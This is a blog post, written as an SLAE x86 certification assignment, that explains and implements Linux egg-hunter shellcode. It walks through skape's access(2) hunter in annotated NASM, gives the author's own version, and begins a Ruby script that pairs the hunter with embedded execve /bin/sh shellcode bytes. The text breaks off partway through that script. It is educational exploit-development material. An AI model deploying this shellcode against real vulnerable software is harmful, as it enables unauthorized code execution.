<!doctype html><html lang=en-us><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script type=text/javascript src=../../static/js/cactus.js></script><link rel=stylesheet href=../../static/css/style.css type=text/css><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>SLAE x86 - Assignment 0x3 | jsn></title>
<link rel=canonical href=https://jsnv.dev/posts/slae_x86_a3/><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://jsnv.dev/posts/slae_x86_a3/"><meta property="og:site_name" content="jsn>"><meta property="og:title" content="SLAE x86 - Assignment 0x3"><meta property="og:description" content="Egg Hunter Shellcode Objectives Study about egg hunter shellcode Create a working demo of the egg hunter Should be configurable of different payloads Overview Egg hunter shellcode is a helper shellcode that will scan the memory pages to search for a predefined pattern called egg. The egg is appended in the main shellcode that will be executed during the exploitation. It is useful when there’s a limited shellcode size for a vulnerable application’s input. The egg hunter shellcode can then be used as an alternative since it is small, but the main shellcode should be put in other inputs to find it in the memory. This research paper presented several implementations for both Linux and Windows"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-20T08:27:30+00:00"><meta property="article:modified_time" content="2021-10-20T08:27:30+00:00"><meta property="article:tag" content="Exploit_dev"><meta property="article:tag" content="Assembly"><meta name=twitter:card content="summary"><meta name=twitter:title content="SLAE x86 - Assignment 0x3"><meta name=twitter:description content="Egg Hunter Shellcode Objectives Study about egg hunter shellcode Create a working demo of the egg hunter Should be configurable of different payloads Overview Egg hunter shellcode is a helper shellcode that will scan the memory pages to search for a predefined pattern called egg. The egg is appended in the main shellcode that will be executed during the exploitation. It is useful when there’s a limited shellcode size for a vulnerable application’s input. The egg hunter shellcode can then be used as an alternative since it is small, but the main shellcode should be put in other inputs to find it in the memory. This research paper presented several implementations for both Linux and Windows"><link rel=stylesheet href=https://jsnv.dev/css/styles.e0c78cbd30ccf830ab3999067c1a901c504a80448cc0192be113d008ec8bc141cfb7761248cf6ee58d860a9439f4079c122ff7e221d6874440f2b55cc9f935db.css integrity="sha512-4MeMvTDM+DCrOZkGfBqQHFBKgESMwBkr4RPQCOyLwUHPt3YSSM9u5Y2GCpQ59AecEi/34iHWh0RA8rVcyfk12w=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://jsnv.dev/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://jsnv.dev/posts/slae_x86_a2/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=https://jsnv.dev/posts/slae_x86_a4/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&text=SLAE%20x86%20-%20Assignment%200x3" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x3" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x3&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&name=SLAE%20x86%20-%20Assignment%200x3&description=%3ch1%20id%3d%22egg-hunter-shellcode%22%3eEgg%20Hunter%20Shellcode%3c%2fh1%3e%0a%3ch2%20id%3d%22objectives%22%3eObjectives%3c%2fh2%3e%0a%3cul%3e%0a%3cli%3eStudy%20about%20egg%20hunter%20shellcode%3c%2fli%3e%0a%3cli%3eCreate%20a%20working%20demo%20of%20the%20egg%20hunter%0a%3cul%3e%0a%3cli%3eShould%20be%20configurable%20of%20different%20payloads%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3c%2ful%3e%0a%3ch2%20id%3d%22overview%22%3eOverview%3c%2fh2%3e%0a%3cp%3eEgg%20hunter%20shellcode%20is%20a%20helper%20shellcode%20that%20will%20scan%20the%20memory%20pages%20to%20search%20for%20a%20predefined%20pattern%20called%20%3ccode%3eegg%3c%2fcode%3e.%0aThe%20egg%20is%20appended%20in%20the%20main%20shellcode%20that%20will%20be%20executed%20during%20the%20exploitation.%0aIt%20is%20useful%20when%20there%26rsquo%3bs%20a%20limited%20shellcode%20size%20for%20a%20vulnerable%20application%26rsquo%3bs%20input.%0aThe%20egg%20hunter%20shellcode%20can%20then%20be%20used%20as%20an%20alternative%20since%20it%20is%20small%2c%20but%20the%20main%20shellcode%20should%20be%20put%20in%20other%20inputs%20to%20find%20it%20in%20the%20memory.%0aThis%20%3ca%20href%3d%22http%3a%2f%2fwww.hick.org%2fcode%2fskape%2fpapers%2fegghunt-shellcode.pdf%22%3e%3ccode%3eresearch%20paper%3c%2fcode%3e%3c%2fa%3e%20presented%20several%20implementations%20for%20both%20Linux%20and%20Windows%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&t=SLAE%20x86%20-%20Assignment%200x3" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#objectives>Objectives</a></li><li><a href=#overview>Overview</a></li><li><a href=#dissecting-the-shellcode>Dissecting the shellcode</a><ul><li><ul><li><a href=#recall>Recall</a></li></ul></li></ul></li><li><a href=#implementation>Implementation</a></li><li><a href=#dynamic-configuration>Dynamic Configuration</a></li><li><a href=#script-usage-and-testing>Script usage and testing</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">SLAE x86 - Assignment 0x3</h1><div class=meta><div class=postdate><time datetime="2021-10-20 08:27:30 +0000 UTC" itemprop=datePublished>2021-10-20</time></div><div class=article-read-time><i class="far fa-clock"></i>
7 minute read</div><div class=article-category><i class="fas fa-archive"></i>
<a class=category-link href=/categories/certification>certification</a></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/exploit_dev rel=tag>exploit_dev</a>
,
<a class=tag-link href=/tags/assembly rel=tag>assembly</a></div></div></header><div class=content itemprop=articleBody><h1 id=egg-hunter-shellcode>Egg Hunter Shellcode</h1><h2 id=objectives>Objectives</h2><ul><li>Study about egg hunter shellcode</li><li>Create a working demo of the egg hunter<ul><li>Should be configurable of different payloads</li></ul></li></ul><h2 id=overview>Overview</h2><p>Egg hunter shellcode is a helper shellcode that will scan the memory pages to search for a predefined pattern called <code>egg</code>.
The egg is appended in the main shellcode that will be executed during the exploitation.
It is useful when there&rsquo;s a limited shellcode size for a vulnerable application&rsquo;s input.
The egg hunter shellcode can then be used as an alternative since it is small, but the main shellcode should be put in other inputs to find it in the memory.
This <a href=http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf><code>research paper</code></a> presented several implementations for both Linux and Windows</p><h2 id=dissecting-the-shellcode>Dissecting the shellcode</h2><p>Below is the overview of the shellcode utilizing <code>access(2)</code> syscall:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>-2
</span><span class=lnt>-1
</span><span class=lnt> 0
</span><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=c1>; Note that the first two columns are moved as comments</span>
</span></span><span class=line><span class=cl><span class=c1>; to get proper highlighting of the nasm code.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=mh>0x50905090</span>  <span class=c1>; 00000000 BB90509050</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>ecx</span>         <span class=c1>; 00000005 31C9</span>
</span></span><span class=line><span class=cl><span class=nf>mul</span> <span class=nb>ecx</span>             <span class=c1>; 00000007 F7E1</span>
</span></span><span class=line><span class=cl><span class=nf>or</span> <span class=nb>dx</span><span class=p>,</span><span class=mh>0xfff</span>         <span class=c1>; 00000009 6681CAFF0F</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=nb>edx</span>             <span class=c1>; 0000000E 42</span>
</span></span><span class=line><span class=cl><span class=nf>pusha</span>               <span class=c1>; 0000000F 60</span>
</span></span><span class=line><span class=cl><span class=nf>lea</span> <span class=nb>ebx</span><span class=p>,[</span><span class=nb>edx</span><span class=o>+</span><span class=mh>0x4</span><span class=p>]</span>   <span class=c1>; 00000010 8D5A04</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0x21</span>         <span class=c1>; 00000013 B021</span>
</span></span><span class=line><span class=cl><span class=nf>int</span> <span class=mh>0x80</span>            <span class=c1>; 00000015 CD80</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0xf2</span>         <span class=c1>; 00000017 3CF2</span>
</span></span><span class=line><span class=cl><span class=nf>popa</span>                <span class=c1>; 00000019 61</span>
</span></span><span class=line><span class=cl><span class=nf>jz</span> <span class=mh>0x9</span>              <span class=c1>; 0000001A 74ED</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=p>[</span><span class=nb>edx</span><span class=p>],</span><span class=nb>ebx</span>       <span class=c1>; 0000001C 391A</span>
</span></span><span class=line><span class=cl><span class=nf>jnz</span> <span class=mh>0xe</span>             <span class=c1>; 0000001E 75EE</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=p>[</span><span class=nb>edx</span><span class=o>+</span><span class=mh>0x4</span><span class=p>],</span><span class=nb>ebx</span>   <span class=c1>; 00000020 395A04</span>
</span></span><span class=line><span class=cl><span class=nf>jnz</span> <span class=mh>0xe</span>             <span class=c1>; 00000023 75E9</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=nb>edx</span>             <span class=c1>; 00000025 FFE2</span>
</span></span></code></pre></td></tr></table></div></div><p>For the first three lines, the registers are being prepared for the next instructions.
See comments in the code below for inline explanation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span><span class=mh>0x50905090</span>  <span class=c1>; 0x50905090 is the egg with equivalent instructions of:</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; nops; push eax; nops; eax</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; The egg is saved into ebx will then be use to compare</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; in instructions lines 13 and 14 of full code</span>
</span></span><span class=line><span class=cl><span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span><span class=nb>ecx</span>         <span class=c1>; clear the value of ecx; ecx xor ecx = 0</span>
</span></span><span class=line><span class=cl><span class=nf>mul</span> <span class=nb>ecx</span>             <span class=c1>; clear eax and edx</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; multiplying 0x0 with eax will result to 0x0 for</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; both eax and edx, see https://www.felixcloutier.com/x86/mul</span>
</span></span></code></pre></div><p>Then the next lines prepare registers for the access(2) syscall</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=nf>or</span> <span class=nb>dx</span><span class=p>,</span><span class=mh>0xfff</span>         <span class=c1>; 0x0 or 0xfff = 0xfff, means dx = 0xfff = 4095</span>
</span></span><span class=line><span class=cl><span class=nf>inc</span> <span class=nb>edx</span>             <span class=c1>; makes edx = 4096</span>
</span></span><span class=line><span class=cl><span class=nf>pusha</span>               <span class=c1>; push registers to stack,</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; this is to save the values and then use them later</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; since the next line will alter ebx</span>
</span></span><span class=line><span class=cl><span class=nf>lea</span> <span class=nb>ebx</span><span class=p>,[</span><span class=nb>edx</span><span class=o>+</span><span class=mh>0x4</span><span class=p>]</span>   <span class=c1>; ebx = address to be validated</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; in this case is edx + 0x4</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; 4 bytes is added since 8 bytes will be validated in single swoop</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; which means edx - 0x4 is within the range as well</span>
</span></span></code></pre></div><p>System call access(2), then the return value is stored in eax. More details in: <a href=https://man7.org/linux/man-pages/man2/access.2.html>https://man7.org/linux/man-pages/man2/access.2.html</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0x21</span>         <span class=c1>; 0x21 is the code for access(2)</span>
</span></span><span class=line><span class=cl><span class=nf>int</span> <span class=mh>0x80</span>            <span class=c1>; syscall access(address_to_be_validated, NULL)</span>
</span></span></code></pre></div><p>The next lines are series of conditions to check if the current page contains the egg</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=nf>cmp</span> <span class=nb>al</span><span class=p>,</span><span class=mh>0xf2</span>         <span class=c1>; The return value in eax is compared to 0xf2,</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; the value for EFAULT - the page is inaccessible.</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; If the value are the same, zero flag will be set.</span>
</span></span><span class=line><span class=cl><span class=nf>popa</span>                <span class=c1>; restore the previous registers state before line 6</span>
</span></span><span class=line><span class=cl><span class=nf>jz</span> <span class=mh>0x9</span>              <span class=c1>; If zero flag is set (page is inaccessible)</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; next instruction will be jump back to line 4</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; which will increment the dx to check the next page.</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; Otherwise, if page is accessible, execution flow will proceed</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=p>[</span><span class=nb>edx</span><span class=p>],</span><span class=nb>ebx</span>       <span class=c1>; Checks if the egg is found in the current page</span>
</span></span><span class=line><span class=cl><span class=nf>jnz</span> <span class=mh>0xe</span>             <span class=c1>; if not, jump to line 5 which will iterate through the current page</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; else proceed with the execution flow.</span>
</span></span><span class=line><span class=cl><span class=nf>cmp</span> <span class=p>[</span><span class=nb>edx</span><span class=o>+</span><span class=mh>0x4</span><span class=p>],</span><span class=nb>ebx</span>   <span class=c1>; Checks again if the next 4 bytes contains the egg again</span>
</span></span><span class=line><span class=cl>                    <span class=c1>; since it should be prepended twice</span>
</span></span><span class=line><span class=cl><span class=nf>jnz</span> <span class=mh>0xe</span>             <span class=c1>; if not, same conditions with line 14</span>
</span></span><span class=line><span class=cl><span class=nf>jmp</span> <span class=nb>edx</span>             <span class=c1>; if all conditions are met, jump to the current page</span>
</span></span></code></pre></div><h4 id=recall>Recall</h4><p>The egghunter shellcode contains the following stages:</p><ul><li>initialization of registers</li><li>alignment of page to be validated</li><li>inspections of the page by means of several conditions</li></ul><h2 id=implementation>Implementation</h2><p>The below nasm code is the implementation of egghunter shellcode based on the understanding of the concept. This is not tested in several systems and not guaranteed to be working at all times:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=c1>; Purpose: egghunter</span>
</span></span><span class=line><span class=cl><span class=c1>; inspired from: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>global</span> <span class=nv>_start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>section</span> <span class=nv>.text</span>
</span></span><span class=line><span class=cl>  <span class=no>EGG</span><span class=kd> equ</span> <span class=mh>0x50905090</span>     <span class=c1>; EGG = push eax; nop; push eax; nop</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>_start:</span>
</span></span><span class=line><span class=cl>  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>           <span class=c1>; clear</span>
</span></span><span class=line><span class=cl>  <span class=nf>mul</span> <span class=nb>ecx</span>                <span class=c1>; registers</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>page_alignment:</span>
</span></span><span class=line><span class=cl>  <span class=nf>or</span> <span class=nb>bx</span><span class=p>,</span> <span class=mh>0xfff</span>           <span class=c1>; add 4095 to bx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>inspection:</span>
</span></span><span class=line><span class=cl>  <span class=nf>inc</span> <span class=nb>ebx</span>                <span class=c1>; make ebx = 4096 - page size</span>
</span></span><span class=line><span class=cl>  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x21</span>           <span class=c1>; syscall for accept</span>
</span></span><span class=line><span class=cl>  <span class=nf>int</span> <span class=mh>0x80</span>               <span class=c1>; execute syscall</span>
</span></span><span class=line><span class=cl>  <span class=nf>cmp</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xf2</span>           <span class=c1>; check if the current page(ebx) is accessible</span>
</span></span><span class=line><span class=cl>  <span class=nf>jz</span> <span class=nv>page_alignment</span>      <span class=c1>; jump to page_alignment if page is inaccessible</span>
</span></span><span class=line><span class=cl>  <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>ebx</span>           <span class=c1>; mov address in ebx to edi</span>
</span></span><span class=line><span class=cl>  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=nv>EGG</span>           <span class=c1>; value of the egg stored in eax</span>
</span></span><span class=line><span class=cl>  <span class=nf>scasd</span>                  <span class=c1>; check if the current page contains the EGG</span>
</span></span><span class=line><span class=cl>                         <span class=c1>; this will scan the address in edi and compare</span>
</span></span><span class=line><span class=cl>                         <span class=c1>; with the value of eax;</span>
</span></span><span class=line><span class=cl>                         <span class=c1>; this is the same operation used in the third</span>
</span></span><span class=line><span class=cl>                         <span class=c1>; implementation of egghunter by skape</span>
</span></span><span class=line><span class=cl>  <span class=nf>jnz</span> <span class=nv>inspection</span>         <span class=c1>; jump to inspection if EGG is not found</span>
</span></span><span class=line><span class=cl>  <span class=nf>jmp</span> <span class=nb>edi</span>                <span class=c1>; if EGG is found, jump to the address</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=dynamic-configuration>Dynamic Configuration</h2><p>The simple Ruby script below will dynamically use shellcodes that will be passed into the <code>-p</code> or <code>--payload</code> flag (default: &lsquo;bin/sh&rsquo;). Also, there are 4 choices which egghunter shellcode to be used: 3 implementations of skape, and the egghunter from <a href=#implementation>above section</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl><span class=c1># Author: Jason Villaluna</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;optparse&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Default payload to use if nothing is pass</span>
</span></span><span class=line><span class=cl><span class=c1># execve(/bin//sh, NULL, NULL)</span>
</span></span><span class=line><span class=cl><span class=no>PAYLOAD</span> <span class=o>=</span> <span class=s1>&#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50&#39;</span><span class=p>\</span>
</span></span><span class=line><span class=cl>          <span class=s1>&#39;\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><span class=o>.</span><span class=n>freeze</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span>
</span></span><span class=line><span class=cl>  <span class=n>parse_args</span>
</span></span><span class=line><span class=cl>  <span class=n>get_egghunter</span>
</span></span><span class=line><span class=cl>  <span class=n>compile_nasm</span>
</span></span><span class=line><span class=cl>  <span class=vi>@egghunter_shellcode</span> <span class=o>=</span> <span class=n>generate_shellcode</span>
</span></span><span class=line><span class=cl>  <span class=n>replace_shellcode</span>
</span></span><span class=line><span class=cl>  <span class=n>compile_binary</span>
</span></span><span class=line><span class=cl><span class=k>rescue</span> <span class=no>OptionParser</span><span class=o>::</span><span class=no>MissingArgument</span>
</span></span><span class=line><span class=cl>  <span class=nb>puts</span> <span class=s2>&#34;Missing argument:&#34;</span>
</span></span><span class=line><span class=cl>  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse</span> <span class=sx>%w[--help]</span>
</span></span><span class=line><span class=cl><span class=k>rescue</span> <span class=no>StandardError</span> <span class=o>=&gt;</span> <span class=n>e</span>
</span></span><span class=line><span class=cl>  <span class=nb>puts</span> <span class=s2>&#34;An error </span><span class=si>#{</span><span class=n>e</span><span class=o>.</span><span class=n>inspect</span><span class=si>}</span><span class=s2> occurred&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nb>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Map the egghunter&#39;s filename to use</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_egghunter</span>
</span></span><span class=line><span class=cl>  <span class=n>egghunters</span> <span class=o>=</span> <span class=o>[</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;egghunter_access&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;egghunter_access_revisited&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;egghunter_sigaction&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;egghunter_access_mod&#39;</span>
</span></span><span class=line><span class=cl>  <span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=vi>@filename</span> <span class=o>=</span> <span class=n>egghunters</span><span class=o>[</span><span class=vi>@egghunter</span> <span class=o>-</span> <span class=mi>1</span><span class=o>]</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Compile the nasm code</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compile_nasm</span>
